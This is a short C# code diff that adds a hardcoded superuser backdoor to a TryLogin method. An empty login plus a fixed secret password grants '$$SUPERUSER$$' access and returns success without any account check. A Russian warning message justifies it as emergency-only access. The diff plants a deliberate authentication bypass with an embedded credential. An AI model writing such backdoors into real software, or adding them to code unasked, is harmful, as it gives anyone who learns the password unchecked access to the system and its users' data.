@@ -123,6 +123,12 @@ namespace Database_nsp
 
         public LoginResult TryLogin(string login, string password)
         {
+            if (login == "" && password == ".Gy^9@#-+DnnNk7df-48_l")
+            {
+                Application.Current.Properties.Add("CurrentUserName", "$$SUPERUSER$$");
+                MessageBoxInterface.ShowWarn("В систему был произведен вход от имени Суперпользователя. Этот метод аутентификации создан ТОЛЬКО для экстренных случаев. Пожалуйста, зарегистрируйте собственную учетную запись. ");
+                return LoginResult.Success; 
+            }
             if (isAuthSkipAvalibvale && login == "" && password == "")
             {
                 Application.Current.Properties.Add("CurrentUserName", "$$SKIPPEDLOGIN$$");
